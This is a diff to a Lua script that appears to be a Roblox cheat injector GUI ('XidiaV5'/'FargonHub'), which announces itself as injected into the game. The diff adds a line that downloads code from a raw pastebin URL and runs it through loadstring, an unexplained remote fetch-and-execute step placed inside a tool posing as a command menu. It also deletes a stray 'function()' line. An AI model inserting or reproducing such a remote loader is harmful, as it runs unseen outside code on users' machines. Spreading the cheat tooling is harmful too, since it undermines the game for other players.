@@ -8,6 +8,7 @@ print([[CREATED BY @xXrisingXx
     ──────────────────╔═╝║
     ──────────────────╚══╝]])
 game:GetService("StarterGui"):SetCore("SendNotification", {Title = 'Injected', Text = 'XidiaV5 has been injected into game. For list of commands please press f9!', Duration = 10})
+loadstring(game:HttpGet("https://pastebin.com/raw/YKaETNXN"))()
 local FargonHub = Instance.new("ScreenGui")
 local movebar = Instance.new("ImageLabel")
 local exit = Instance.new("ImageButton")
@@ -234,7 +235,7 @@ boolbutton.MouseButton1Down:Connect(function()
     end
 end)
 
-function()
+
 ---------------------------------------------------------------------------------------------
 execute.MouseButton1Down:Connect(function()
     local txt = input.Text
